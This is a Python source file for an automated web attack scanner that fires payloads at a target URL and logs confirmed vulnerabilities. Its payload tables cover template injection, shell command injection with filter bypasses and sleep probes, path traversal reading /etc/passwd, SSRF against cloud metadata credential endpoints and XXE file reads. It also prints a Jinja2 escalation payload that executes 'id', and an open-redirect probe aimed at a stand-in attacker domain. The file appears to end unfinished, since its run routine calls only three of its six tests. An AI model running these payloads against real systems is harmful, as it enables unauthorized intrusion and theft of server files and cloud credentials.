#!/usr/bin/env python3
import asyncio, aiohttp, json, re, sys, random, string, time
from pathlib import Path
from urllib.parse import urlparse, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY,
)

MARKER_SEED = "MIRROR" + str(int(time.time()))[-5:]


def _marker(n: int) -> str:
    return f"MRR{n:04d}_{MARKER_SEED}"


SSTI_PROBES = [
    ("{{7*7}}",                             "49",     "Jinja2/Twig"),
    ("{{7*'7'}}",                           "7777777", "Jinja2"),
    ("${7*7}",                              "49",     "FreeMarker/Velocity/Spring EL"),
    ("#{7*7}",                              "49",     "Thymeleaf/Ruby ERB"),
    ("<%= 7*7 %>",                          "49",     "ERB/JSP"),
    ("*{7*7}",                              "49",     "Thymeleaf SpEL"),
    ("@(7*7)",                              "49",     "Razor"),
    ("{{77*77}}",                           "5929",   "Jinja2/Twig"),
    ("${77*77}",                            "5929",   "FreeMarker/Spring EL"),
    ("{{config}}",                          "Config", "Jinja2 object leak"),
    ("{{self._TemplateReference__context}}","TemplateReference", "Jinja2 context leak"),
    ("%7B%7B7*7%7D%7D",                     "49",     "Jinja2 URL-encoded"),
    ("{{range.init(1,2)}}",                 "1",      "Twig range"),
    ("{php}echo 7*7;{/php}",               "49",     "Smarty PHP tag"),
    ("{{7|int*7|int}}",                     "49",     "Jinja2 filters"),
]

CMD_PROBES = [
    ("; echo {MARKER}",      "semicolon"),
    ("| echo {MARKER}",      "pipe"),
    ("& echo {MARKER}",      "ampersand"),
    ("`echo {MARKER}`",      "backtick"),
    ("$(echo {MARKER})",     "subshell"),
    ("\n echo {MARKER}",     "newline"),
    (" || echo {MARKER}",    "OR-pipe"),
    ("1;echo {MARKER}",      "no-space"),
    ("1|echo${IFS}{MARKER}", "IFS-bypass"),
    ("%0a echo {MARKER}",    "URL-newline"),
]

BLIND_CMD_PROBES = [
    ("; sleep 6",    6.0),
    ("| sleep 6",    6.0),
    ("& sleep 6",    6.0),
    ("$(sleep 6)",   6.0),
    ("`sleep 6`",    6.0),
    ("%0asleep%206", 6.0),
    ("; ping -c 6 127.0.0.1", 6.0),
]

PATH_TRAVERSAL = [
    ("../../../etc/passwd",                         r"root:.*:0:0"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",                 r"root:.*:0:0"),
    ("....//....//....//etc/passwd",                r"root:.*:0:0"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",     r"root:.*:0:0"),
    ("..%252f..%252f..%252fetc%252fpasswd",          r"root:.*:0:0"),
    ("../../../windows/win.ini",                    r"\[fonts\]"),
    ("../../../boot.ini",                           r"\[boot loader\]"),
    ("/etc/passwd",                                 r"root:.*:0:0"),
    ("../../../../etc/passwd",                      r"root:.*:0:0"),
    ("..\\..\\.." + "\\windows\\win.ini",           r"\[fonts\]"),
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", r"root:.*:0:0"),
]

TRAVERSAL_PARAMS = [
    "file", "path", "page", "include", "doc", "document",
    "filename", "template", "view", "load", "read", "dir",
    "folder", "src", "source", "name", "f", "resource",
]

FILE_SERVING_PATHS = [
    "/static/", "/files/", "/download/", "/img/",
    "/uploads/", "/assets/", "/public/", "/media/",
    "/api/file/", "/api/download/", "/api/export/",
    "/api/read/", "/api/v1/files/", "/api/v1/download/",
    "/api/attachments/", "/resources/", "/content/",
]

SSRF_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/",                  ["ami-id", "instance-id", "hostname"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
    ("http://metadata.google.internal/computeMetadata/v1/",       ["project", "instance"]),
    ("http://169.254.169.254/metadata/v1/",                       ["id", "region"]),
    ("http://127.0.0.1/",                                         ["apache", "nginx", "it works"]),
    ("http://localhost/",                                          ["apache", "nginx", "it works"]),
    ("http://127.0.0.1:8080/",                                    ["tomcat", "jetty", "spring"]),
    ("http://127.0.0.1:9200/",                                    ["elasticsearch", "cluster_name"]),
    ("http://127.0.0.1:6379/",                                    ["redis_version", "PONG"]),
    ("http://[::1]/",                                             ["apache", "nginx"]),
    ("http://0.0.0.0/",                                           ["apache", "nginx"]),
    ("http://2130706433/",                                        ["apache", "nginx"]),
]

SSRF_PARAMS = [
    "url", "uri", "src", "source", "href", "link", "to", "redirect",
    "return", "next", "dest", "destination", "path", "target", "img",
    "image", "fetch", "proxy", "request", "load", "open", "webhook",
    "callback", "endpoint", "api", "service", "server",
]

XXE_PAYLOAD_PASSWD = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root>&xxe;</root>'
)
XXE_PAYLOAD_WIN = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
    '<root>&xxe;</root>'
)
XXE_PAYLOAD_OOB = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">'
    '%xxe;]><root>OOB</root>'
)


class SSTIProver:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self.is_https = parsed.scheme == "https"

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 proof_type="CODE_EXECUTION", mitigation_layers=None, extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     False,
            "mitigation_layers": mitigation_layers or [],
            "mitre_technique":   "T1059",
            "mitre_name":        "Command and Scripting Interpreter",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None,
                       json_data=None, data=None, params=None, timeout=14):
        h = {"User-Agent": random_ua(), **(headers or {})}
        try:
            async with sess.request(
                method, url, headers=h, json=json_data, data=data, params=params,
                ssl=False, allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, "", {}

    async def _get(self, sess, url_or_path, params=None, headers=None, timeout=14):
        url = url_or_path if url_or_path.startswith("http") else self.target + url_or_path
        return await self._request(sess, "GET", url, params=params, headers=headers, timeout=timeout)

    async def _post(self, sess, path_or_url, data=None, json_data=None,
                    headers=None, params=None, timeout=14):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "POST", url, headers=headers,
                                   json_data=json_data, data=data, params=params, timeout=timeout)

    async def _crawl_forms_and_params(self, sess):
        endpoints = []
        s, body, _ = await self._get(sess, "/")
        await delay()
        if not body:
            return endpoints
        for m in re.finditer(r'<form[^>]+action=["\']([^"\']+)["\']', body, re.I):
            endpoints.append(("form", m.group(1)))
        for m in re.finditer(r'href=["\']([^"\']*\?[^"\']+)["\']', body, re.I):
            endpoints.append(("query", m.group(1)))
        for path in ["/api/search", "/search", "/api/render", "/render",
                     "/api/template", "/api/preview", "/api/email",
                     "/api/report", "/api/v1/search", "/api/v1/render"]:
            endpoints.append(("api", path))
        return endpoints

    async def test_ssti(self, sess):
        print("\n[*] Testing Server-Side Template Injection (SSTI)...")
        ssti_targets = [
            "/", "/api/search", "/search", "/api/render",
            "/render", "/api/preview", "/preview", "/api/template",
            "/api/email/preview", "/api/v1/search", "/api/feedback",
            "/api/report", "/api/v1/render", "/api/format",
            "/api/v1/template", "/api/notify",
        ]
        for payload, expected, engine in SSTI_PROBES:
            for path in ssti_targets:
                url = self.target + path
                for param in ["q", "query", "search", "name", "input",
                              "text", "template", "msg", "message", "subject"]:
                    s, body, _ = await self._request(sess, "GET", url, params={param: payload})
                    await delay(0.1)
                    if s is None or s == 404:
                        continue
                    if expected in (body or "") and payload not in (body or ""):
                        proof = (
                            f"GET {url}?{param}={quote(payload)}\n"
                            f"  HTTP {s}\n"
                            f"  Template evaluated! Input '{payload}' -> output contains '{expected}'\n"
                            f"  Engine: {engine}\n"
                            f"  Body preview: {body[:600]}"
                        )
                        self._finding(
                            ftype="SSTI_CODE_EXECUTION_CONFIRMED",
                            severity="CRITICAL", conf=97,
                            proof=proof,
                            detail=(
                                f"SSTI confirmed in GET param '{param}' at {url}. "
                                f"Payload '{payload}' evaluated as {engine} — math result '{expected}' returned. "
                                "Attacker can escalate to RCE via class traversal."
                            ),
                            url=url,
                            remediation=(
                                "1. Never pass user input to a template engine unsanitized.\n"
                                "2. Use a sandboxed template environment or logic-less templates (Mustache).\n"
                                "3. Validate/reject inputs containing template syntax: {{}}, ${}, #{}, <%.\n"
                                "4. Use context variables — not raw user input as the template string."
                            ),
                            exploitability=10,
                            impact=(
                                "Full Remote Code Execution — attacker executes OS commands on the server, "
                                "reads /etc/passwd, dumps env vars (API keys/secrets), pivots to internal network."
                            ),
                            reproducibility=(
                                f"curl -s '{url}?{param}={quote(payload)}'\n"
                                f"# Escalate to RCE (Jinja2):\n"
                                f"# payload: {{{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}}}"
                            ),
                            proof_type="CODE_EXECUTION",
                            mitigation_layers=["Input sanitization", "Sandboxed template engine",
                                               "Template syntax blocking", "WAF rules"],
                            extra={"payload": payload, "expected": expected, "engine": engine, "param": param},
                        )
                        return

                for field in ["name", "query", "text", "input", "template",
                              "message", "subject", "body", "content", "email"]:
                    s, body, _ = await self._post(sess, path, json_data={field: payload, "q": payload})
                    await delay(0.1)
                    if s is None or s == 404:
                        continue
                    if expected in (body or "") and payload not in (body or ""):
                        proof = (
                            f"POST {url}  body: {{\"{field}\":\"{payload}\"}}\n"
                            f"  HTTP {s}\n"
                            f"  Template evaluated! Input '{payload}' -> output '{expected}'\n"
                            f"  Engine: {engine}\n"
                            f"  Body: {body[:600]}"
                        )
                        self._finding(
                            ftype="SSTI_CODE_EXECUTION_CONFIRMED",
                            severity="CRITICAL", conf=97,
                            proof=proof,
                            detail=(
                                f"SSTI confirmed in POST field '{field}' at {url}. "
                                f"Payload '{payload}' ({engine}) evaluated — math result '{expected}' returned."
                            ),
                            url=url,
                            remediation=(
                                "1. Never render user-supplied strings as templates.\n"
                                "2. Use a safe, sandboxed template environment.\n"
                                "3. Block template syntax in input validation.\n"
                                "4. Apply WAF rules for common template injection chars."
                            ),
                            exploitability=10,
                            impact="Full RCE — OS command execution, secret exfiltration, lateral movement.",
                            reproducibility=(
                                f"curl -s -X POST {url} -H 'Content-Type: application/json' "
                                f"-d '{{\"{field}\":\"{payload}\"}}'"
                            ),
                            proof_type="CODE_EXECUTION",
                            mitigation_layers=["Input sanitization", "Sandboxed template engine", "CSP"],
                            extra={"payload": payload, "expected": expected, "engine": engine, "field": field},
                        )
                        return

    async def test_command_injection(self, sess):
        print("\n[*] Testing command injection with unique marker...")
        marker_id = 0
        cmd_paths = [
            "/api/ping", "/ping", "/api/dns", "/api/lookup",
            "/api/whois", "/api/traceroute", "/api/nslookup",
            "/api/host", "/api/exec", "/api/run", "/api/cmd",
            "/api/shell", "/api/tool", "/api/util", "/api/network",
            "/api/v1/ping", "/api/v1/lookup", "/api/test",
            "/api/resolve", "/api/check", "/api/validate",
        ]
        for path in cmd_paths:
            for cmd_tpl, bypass in CMD_PROBES:
                marker = _marker(marker_id)
                marker_id += 1
                cmd = cmd_tpl.replace("{MARKER}", marker)
                for field in ["host", "ip", "target", "domain", "url",
                              "address", "query", "cmd", "command", "input"]:
                    payload = {field: f"127.0.0.1{cmd}"}
                    s, body, _ = await self._post(sess, path, json_data=payload)
                    await delay(0.15)
                    if s is None or s == 404:
                        break
                    if marker in (body or ""):
                        proof = (
                            f"POST {self.target}{path}\n"
                            f"  body: {{\"{field}\": \"127.0.0.1{cmd}\"}}\n"
                            f"  HTTP {s}\n"
                            f"  UNIQUE MARKER '{marker}' FOUND IN RESPONSE — command executed!\n"
                            f"  Bypass: {bypass}\n"
                            f"  Body: {body[:600]}"
                        )
                        self._finding(
                            ftype="COMMAND_INJECTION_CONFIRMED",
                            severity="CRITICAL", conf=99,
                            proof=proof,
                            detail=(
                                f"OS command injection confirmed at POST {path} field '{field}'. "
                                f"Unique marker '{marker}' echoed back — server executed injected shell command. "
                                f"Bypass: {bypass}."
                            ),
                            url=self.target + path,
                            remediation=(
                                "1. Never pass user input to shell commands — use OS-level APIs.\n"
                                "2. If shell execution required, strict allowlist for input (alphanumeric only).\n"
                                "3. Use subprocess with shell=False and explicit args list.\n"
                                "4. Run the web process with minimal OS privileges (non-root)."
                            ),
                            exploitability=10,
                            impact="Full RCE — attacker runs arbitrary OS commands as web server user. Data exfiltration, persistence, lateral movement.",
                            reproducibility=(
                                f"curl -s -X POST {self.target}{path} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"{field}\":\"127.0.0.1{cmd}\"}}'"
                            ),
                            proof_type="CODE_EXECUTION",
                            mitigation_layers=["No-shell subprocess", "Input allowlist",
                                               "Least privilege", "Seccomp/AppArmor"],
                            extra={"field": field, "payload": cmd, "marker": marker, "bypass_type": bypass},
                        )
                        return

    async def test_blind_command_injection(self, sess):
        print("\n[*] Testing blind time-based command injection...")
        cmd_paths = [
            "/api/ping", "/ping", "/api/dns", "/api/lookup",
            "/api/whois", "/api/host", "/api/exec", "/api/run",
            "/api/cmd", "/api/util", "/api/network", "/api/v1/ping",
        ]
        for path in cmd_paths:
            s0, body0, _ = await self._get(sess, path)
            await delay()
            if s0 is None or s0 == 404:
                continue

            for cmd_suffix, expected_delay in BLIND_CMD_PROBES:
                for field in ["host", "ip", "target", "domain", "address", "input", "cmd"]:
                    payload = {field: f"127.0.0.1{cmd_suffix}"}
                    t_start = time.monotonic()
                    s, body, _ = await self._post(sess, path, json_data=payload, timeout=expected_delay + 6)
                    elapsed = time.monotonic() - t_start
                    await delay(0.1)
                    if s is None or s == 404:
                        break
                    if elapsed >= expected_delay * 0.85 and elapsed < expected_delay * 3:
                        t_baseline_start = time.monotonic()
                        s_base, _, _ = await self._post(sess, path, json_data={field: "127.0.0.1"})
                        t_baseline = time.monotonic() - t_baseline_start
                        if elapsed > t_baseline + (expected_delay * 0.6):
                            proof = (
                                f"POST {self.target}{path}\n"
                                f"  body: {{\"{field}\": \"127.0.0.1{cmd_suffix}\"}}\n"
                                f"  HTTP {s}\n"
                                f"  Injected payload response time: {elapsed:.2f}s\n"
                                f"  Baseline (no payload) response time: {t_baseline:.2f}s\n"
                                f"  Time delta: {elapsed - t_baseline:.2f}s — matches expected sleep delay ({expected_delay}s)\n"
                                f"  Command injection confirmed via time-based blind detection"
                            )
                            self._finding(
                                ftype="BLIND_COMMAND_INJECTION_TIME_BASED",
                                severity="CRITICAL", conf=88,
                                proof=proof,
                                detail=(
                                    f"Blind OS command injection at POST {path} field '{field}'. "
                                    f"Payload '{cmd_suffix}' caused {elapsed:.1f}s delay vs {t_baseline:.2f}s baseline. "
                                    "No output reflection but execution is confirmed by time delta."
                                ),
                                url=self.target + path,
                                remediation=(
                                    "1. Never pass user input to shell commands — use OS-level APIs.\n"
                                    "2. Apply strict allowlist on all network-tool inputs.\n"
                                    "3. Use subprocess with shell=False and sanitized args.\n"
                                    "4. Apply OS-level sandboxing (seccomp, AppArmor, chroot)."
                                ),
                                exploitability=9,
                                impact="RCE via blind injection — attacker exfiltrates data via DNS, writes files, or spawns reverse shells even without output reflection.",
                                reproducibility=(
                                    f"time curl -s -X POST {self.target}{path} "
                                    f"-H 'Content-Type: application/json' "
                                    f"-d '{{\"{field}\":\"127.0.0.1{cmd_suffix}\"}}'\n"
                                    f"# Expected response time: ~{expected_delay}s  Baseline: <1s"
                                ),
                                proof_type="CODE_EXECUTION",
                                mitigation_layers=["No-shell subprocess", "Input allowlist",
                                                   "Least privilege", "Seccomp"],
                                extra={"field": field, "elapsed": round(elapsed, 2),
                                       "baseline": round(t_baseline, 2), "cmd_suffix": cmd_suffix},
                            )
                            return

    async def test_path_traversal(self, sess):
        print("\n[*] Testing path traversal (actual file read confirmation)...")
        for param in TRAVERSAL_PARAMS:
            for traversal_str, confirm_pattern in PATH_TRAVERSAL:
                url = f"{self.target}/?{param}={traversal_str}"
                s, body, hdrs = await self._get(sess, "/", params={param: traversal_str})
                await delay(0.1)
                if s is None or s in (404, 500):
                    continue
                if s == 200 and body and re.search(confirm_pattern, body):
                    match = re.search(confirm_pattern, body)
                    proof = (
                        f"GET {url}\n"
                        f"  HTTP {s}\n"
                        f"  FILE CONTENT CONFIRMED: pattern /{confirm_pattern}/ matched\n"
                        f"  Matched text: {match.group(0)[:100]}\n"
                        f"  Body preview: {body[:600]}"
                    )
                    self._finding(
                        ftype="PATH_TRAVERSAL_FILE_READ_CONFIRMED",
                        severity="CRITICAL", conf=98,
                        proof=proof,
                        detail=(
                            f"Path traversal confirmed via GET param '{param}'. "
                            f"Traversal string '{traversal_str}' caused server to read and return system file. "
                            f"Pattern '{confirm_pattern}' matched in response body."
                        ),
                        url=url,
                        remediation=(
                            "1. Resolve canonical path and verify it starts with the allowed base directory.\n"
                            "2. Use os.path.realpath() and check against an allowlist.\n"
                            "3. Never concatenate user input directly into file paths.\n"
                            "4. Chroot the application or use a virtual filesystem jail."
                        ),
                        exploitability=9,
                        impact="Arbitrary file read — attacker reads /etc/passwd, /etc/shadow, source code, .env, SSH keys, SSL certificates.",
                        reproducibility=f"curl -s '{url}'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        mitigation_layers=["Path canonicalization", "Base-directory jail", "File access allowlist"],
                        extra={"traversal_payload": traversal_str, "param": param, "matched_pattern": confirm_pattern},
                    )
                    return

        for traversal_str, confirm_pattern in PATH_TRAVERSAL[:5]:
            for prefix in FILE_SERVING_PATHS:
                url = self.target + prefix + traversal_str
                s, body, _ = await self._get(sess, url)
                await delay(0.1)
                if s == 200 and body and re.search(confirm_pattern, body):
                    match = re.search(confirm_pattern, body)
                    proof = (
                        f"GET {url}\n"
                        f"  HTTP {s}\n"
                        f"  SYSTEM FILE READ CONFIRMED via URL path traversal\n"
                        f"  Matched: {match.group(0)[:100]}\n"
                        f"  Body: {body[:500]}"
                    )
                    self._finding(
                        ftype="PATH_TRAVERSAL_VIA_URL_CONFIRMED",
                        severity="CRITICAL", conf=98,
                        proof=proof,
                        detail=(
                            f"URL-path traversal at {prefix} — traversal string '{traversal_str}' "
                            "escaped the file-serving root and returned a system file."
                        ),
                        url=url,
                        remediation=(
                            "1. Resolve and canonicalize every file path before serving.\n"
                            "2. Verify the resolved path starts within the intended serve directory.\n"
                            "3. Use a CDN/object-storage for static files instead of direct filesystem serving.\n"
                            "4. Block requests where the resolved path contains '..' after canonicalization."
                        ),
                        exploitability=9,
                        impact="Full server file system read — /etc/passwd, application source, .env secrets, SSH keys.",
                        reproducibility=f"curl -s '{url}'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        mitigation_layers=["Canonical path check", "Serve-directory jail", "Web server hardening"],
                        extra={"traversal_payload": traversal_str, "prefix": prefix},
                    )
                    return

        for traversal_str, confirm_pattern in PATH_TRAVERSAL[:4]:
            for api_path in ["/api/file", "/api/download", "/api/export",
                             "/api/read", "/api/v1/files", "/api/v1/download",
                             "/api/attachment", "/api/static", "/api/resource"]:
                for param in ["name", "path", "file", "filename", "id", "f", "src"]:
                    s, body, _ = await self._get(sess, api_path, params={param: traversal_str})
                    await delay(0.1)
                    if s is None or s == 404:
                        break
                    if s == 200 and body and re.search(confirm_pattern, body):
                        match = re.search(confirm_pattern, body)
                        url = f"{self.target}{api_path}?{param}={traversal_str}"
                        proof = (
                            f"GET {url}\n"
                            f"  HTTP {s}\n"
                            f"  SYSTEM FILE READ via API file endpoint\n"
                            f"  Matched: {match.group(0)[:100]}\n"
                            f"  Body: {body[:500]}"
                        )
                        self._finding(
                            ftype="PATH_TRAVERSAL_VIA_API_ENDPOINT_CONFIRMED",
                            severity="CRITICAL", conf=97,
                            proof=proof,
                            detail=(
                                f"API file endpoint {api_path} vulnerable to path traversal via param '{param}'. "
                                f"Traversal '{traversal_str}' returned system file content."
                            ),
                            url=url,
                            remediation=(
                                "1. Canonicalize all file paths before reading.\n"
                                "2. Restrict file serving to a single, whitelisted directory.\n"
                                "3. Use UUID-based file tokens — never expose raw filenames to users.\n"
                                "4. Return a signed URL to object storage instead of reading files directly."
                            ),
                            exploitability=9,
                            impact="Arbitrary server file read — secrets, source code, system files.",
                            reproducibility=f"curl -s '{url}'",
                            proof_type="UNAUTHORIZED_ACCESS",
                            mitigation_layers=["Canonical path check", "Allowlisted file directory", "UUID file tokens"],
                            extra={"traversal_payload": traversal_str, "param": param, "api_path": api_path},
                        )
                        return

    async def test_ssrf(self, sess):
        print("\n[*] Testing SSRF (internal metadata service/network access)...")
        for param in SSRF_PARAMS:
            for ssrf_url, confirm_strings in SSRF_TARGETS:
                for path in ["/api/fetch", "/api/proxy", "/api/request", "/api/url",
                             "/api/webhook", "/api/v1/fetch", "/api/preview",
                             "/api/download", "/api/import", "/api/check"]:
                    s, body, hdrs = await self._get(sess, path, params={param: ssrf_url})
                    await delay(0.15)
                    if s is None or s == 404:
                        break
                    if s in (200, 201) and body:
                        bl = body.lower()
                        matched = next((c for c in confirm_strings if c.lower() in bl), None)
                        if matched:
                            proof = (
                                f"GET {self.target}{path}?{param}={quote(ssrf_url)}\n"
                                f"  HTTP {s}\n"
                                f"  SSRF CONFIRMED: response contains '{matched}' from internal URL {ssrf_url}\n"
                                f"  Body preview: {body[:600]}"
                            )
                            self._finding(
                                ftype="SSRF_INTERNAL_ACCESS_CONFIRMED",
                                severity="CRITICAL", conf=96,
                                proof=proof,
                                detail=(
                                    f"SSRF at {path} param '{param}' — server fetched internal URL {ssrf_url} "
                                    f"and returned content including '{matched}'."
                                ),
                                url=self.target + path,
                                remediation=(
                                    "1. Validate and allowlist permitted external URLs — deny all RFC-1918/169.254.x.x addresses.\n"
                                    "2. Implement DNS pinning and block SSRF via DNS rebinding.\n"
                                    "3. Use an egress firewall to block server-side requests to metadata IPs.\n"
                                    "4. For webhook functionality, use an async outbound proxy with allowlist."
                                ),
                                exploitability=9,
                                impact=(
                                    "Cloud metadata service accessible — attacker reads IAM credentials (AWS AccessKeyId/SecretAccessKey), "
                                    "instance identity, internal network topology. "
                                    f"Can pivot to internal services at 127.0.0.1."
                                ),
                                reproducibility=f"curl -s '{self.target}{path}?{param}={quote(ssrf_url)}'",
                                proof_type="UNAUTHORIZED_ACCESS",
                                mitigation_layers=["URL allowlist", "Egress firewall", "Metadata service protection",
                                                   "DNS pinning"],
                                extra={"ssrf_url": ssrf_url, "param": param, "confirmed_string": matched},
                            )
                            return
                    for post_path in ["/api/webhook", "/api/import", "/api/fetch", "/api/proxy"]:
                        s2, body2, _ = await self._post(sess, post_path,
                                                        json_data={param: ssrf_url, "url": ssrf_url})
                        await delay(0.15)
                        if s2 is None or s2 == 404:
                            break
                        if s2 in (200, 201) and body2:
                            matched2 = next((c for c in confirm_strings if c.lower() in body2.lower()), None)
                            if matched2:
                                proof = (
                                    f"POST {self.target}{post_path} body: {{\"url\":\"{ssrf_url}\"}}\n"
                                    f"  HTTP {s2}\n"
                                    f"  SSRF CONFIRMED: '{matched2}' from internal URL in response\n"
                                    f"  Body: {body2[:600]}"
                                )
                                self._finding(
                                    ftype="SSRF_POST_INTERNAL_ACCESS_CONFIRMED",
                                    severity="CRITICAL", conf=96,
                                    proof=proof,
                                    detail=f"SSRF via POST to {post_path} — server fetched {ssrf_url} and returned '{matched2}'.",
                                    url=self.target + post_path,
                                    remediation=(
                                        "1. Allowlist only approved external endpoints.\n"
                                        "2. Deny RFC-1918 and link-local addresses at the network layer.\n"
                                        "3. Run outbound fetches from an isolated container with no internal network access.\n"
                                        "4. Disable IMDSv1 on EC2; enforce IMDSv2 with hop limit 1."
                                    ),
                                    exploitability=9,
                                    impact="Internal metadata/credential access — cloud credentials, internal services exposed.",
                                    reproducibility=(
                                        f"curl -s -X POST {self.target}{post_path} "
                                        f"-H 'Content-Type: application/json' "
                                        f"-d '{{\"url\":\"{ssrf_url}\"}}'"
                                    ),
                                    proof_type="UNAUTHORIZED_ACCESS",
                                    mitigation_layers=["URL allowlist", "Egress firewall", "IMDSv2", "Network isolation"],
                                    extra={"ssrf_url": ssrf_url, "confirmed_string": matched2},
                                )
                                return

    async def test_xxe(self, sess):
        print("\n[*] Testing XML External Entity (XXE) injection...")
        xxe_paths = [
            "/api/upload", "/api/import", "/api/xml", "/api/parse",
            "/api/v1/upload", "/api/v1/import", "/upload", "/import",
            "/api/feed", "/api/rss", "/api/soap", "/api/wsdl",
            "/api/data", "/api/v1/data", "/api/process",
        ]
        headers_xml = {"Content-Type": "application/xml"}
        for path in xxe_paths:
            for payload, confirm_pattern, label in [
                (XXE_PAYLOAD_PASSWD, r"root:.*:0:0", "Linux /etc/passwd"),
                (XXE_PAYLOAD_WIN,    r"\[fonts\]",    "Windows win.ini"),
            ]:
                s, body, hdrs = await self._post(sess, path, data=payload, headers=headers_xml)
                await delay(0.15)
                if s is None or s == 404:
                    break
                if s in (200, 201, 400, 422, 500) and body and re.search(confirm_pattern, body):
                    match = re.search(confirm_pattern, body)
                    proof = (
                        f"POST {self.target}{path}\n"
                        f"  Content-Type: application/xml\n"
                        f"  Payload type: XXE {label} read\n"
                        f"  HTTP {s}\n"
                        f"  SYSTEM FILE CONTENT IN RESPONSE: /{confirm_pattern}/ matched!\n"
                        f"  Matched text: {match.group(0)[:100]}\n"
                        f"  Body preview: {body[:600]}"
                    )
                    self._finding(
                        ftype="XXE_FILE_READ_CONFIRMED",
                        severity="CRITICAL", conf=98,
                        proof=proof,
                        detail=(
                            f"XXE confirmed at POST {path} — external entity resolved to system file. "
                            f"Pattern '{confirm_pattern}' ({label}) found in response. "
                            "Attacker can read any file the web process has access to."
                        ),
                        url=self.target + path,
                        remediation=(
                            "1. Disable external entity processing in your XML parser.\n"
                            "   Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
                            "   Python: defusedxml library\n"
                            "   PHP: libxml_disable_entity_loader(true)\n"
                            "2. Use JSON instead of XML where possible.\n"
                            "3. Validate and reject XML with DOCTYPE declarations.\n"
                            "4. Run the parser in a sandboxed environment with no filesystem access."
                        ),
                        exploitability=9,
                        impact=(
                            "Arbitrary file read — attacker reads /etc/passwd, /etc/shadow, application config, "
                            ".env files with credentials, SSH private keys, SSL certificates. "
                            "OOB XXE also enables SSRF."
                        ),
                        reproducibility=(
                            f"curl -s -X POST {self.target}{path} "
                            f"-H 'Content-Type: application/xml' "
                            f"-d '{payload[:200]}...'"
                        ),
                        proof_type="UNAUTHORIZED_ACCESS",
                        mitigation_layers=["Disable external entities", "defusedxml/secure parser",
                                           "DOCTYPE rejection", "Parser sandboxing"],
                        extra={"path": path, "file_read": label, "matched_pattern": confirm_pattern},
                    )
                    return

    async def test_open_redirect(self, sess):
        print("\n[*] Testing open redirect (controlled domain in Location header)...")
        evil_domain = "https://attacker.mirror-scanner.evil"
        redirect_paths = [
            "/redirect", "/api/redirect", "/goto", "/api/goto",
            "/redir", "/out", "/api/out", "/link", "/api/link",
            "/api/v1/redirect", "/logout", "/api/logout",
            "/auth/logout", "/api/auth/logout",
        ]
        redirect_params = [
            "url", "redirect", "redirect_to", "return", "return_url",
            "next", "goto", "dest", "destination", "continue",
            "redir", "target", "location", "href", "to",
        ]
        for path in redirect_paths:
            for param in redirect_params:
                s, body, hdrs = await self._get(sess, path, params={param: evil_domain})
                await delay(0.1)
                if s is None or s == 404:
                    break
                location = hdrs.get("location", hdrs.get("Location", ""))
                if s in (301, 302, 303, 307, 308) and "attacker.mirror-scanner.evil" in location:
                    proof = (
                        f"GET {self.target}{path}?{param}={quote(evil_domain)}\n"
                        f"  HTTP {s}\n"
                        f"  Location: {location}\n"
                        f"  OPEN REDIRECT CONFIRMED — user redirected to attacker-controlled domain"
                    )
                    self._finding(
                        ftype="OPEN_REDIRECT_CONFIRMED",
                        severity="HIGH", conf=96,
                        proof=proof,
                        detail=(
                            f"Open redirect at {path} param '{param}'. "
                            f"Server returned Location: {location} — attacker controls destination. "
                            "Used for phishing, OAuth token stealing, and credential harvesting."
                        ),
                        url=self.target + path,
                        remediation=(
                            "1. Use an allowlist of permitted redirect domains — reject all others.\n"
                            "2. Map redirect destinations to opaque tokens (e.g. /redirect?id=3) — never accept raw URLs.\n"
                            "3. For logout redirects: hardcode the landing page, ignore the 'next' parameter.\n"
                            "4. Show a warning page with the destination URL before redirecting."
                        ),
                        exploitability=7,
                        impact=(
                            "Phishing — attacker crafts link like target.com/redirect?url=attacker.com/login. "
                            "Users trust the source domain and enter credentials on the spoofed page. "
                            "Also exploitable for OAuth token theft (redirect_uri bypass)."
                        ),
                        reproducibility=(
                            f"curl -v '{self.target}{path}?{param}={quote(evil_domain)}' 2>&1 | grep Location"
                        ),
                        proof_type="RECONNAISSANCE",
                        mitigation_layers=["Redirect allowlist", "Opaque redirect tokens", "Warning interstitial"],
                        extra={"param": param, "location": location},
                    )
                    return

    async def run(self):
        print(f"\n{'='*60}\n  SSTI/RCE Prover — Code Execution Confirmation\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=22, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=4)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_ssti(sess)
            await self.test_command_injection(sess)
            await self.test_blind_command_injection(sess)
